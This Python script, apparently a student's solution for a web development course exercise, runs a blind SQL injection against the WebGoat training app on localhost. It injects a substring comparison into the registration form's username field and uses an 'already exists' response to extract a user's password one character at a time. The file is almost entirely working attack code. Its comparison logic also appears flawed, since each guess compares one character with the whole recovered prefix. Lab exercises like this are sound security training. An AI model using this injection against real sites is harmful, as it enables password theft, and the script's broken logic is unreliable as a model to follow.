#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ---------------------------------------------------------------------
# Program: Full Stack Web Development
# Author: Feng Li
# Course: WEBD-3010 (273793) Web Development 3
# Created: 2025-10-14
# ---------------------------------------------------------------------
import requests


def main():
    url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"
    header = {
        "host": "localhost:8080",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0",
        "Accept": "*/*",
        "Accept-Language": "en-CA,en-US;q=0.7,en;q=0.3",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        # "Content-Length": "84",
        "Origin": "https://localhost:8080",
        "Connection": "keep-alive",
        "Referer": "https://localhost:8080/WebGoat/start.mvc",
        "Cookie": "JSESSIONID=TTYZu66olC4uswLr5bW9fyi7r36Lia52Mi6DX_9A",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    }

    password = ""
    for length in range(1, 25):
        for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            params = "username_reg=Tom'+AND+substring(password%2C"+str(length)+"%2C1)%3D'" +password+letter + "&email_reg=test%401&password_reg=1&confirm_password_reg=1"
            r = requests.put(url, headers=header, data=params)
            if "already exists" in r.text:
                password += letter
                print(password)
                break
            else:
                continue
    print("Password found: " + password)

if __name__ == '__main__':
    main()
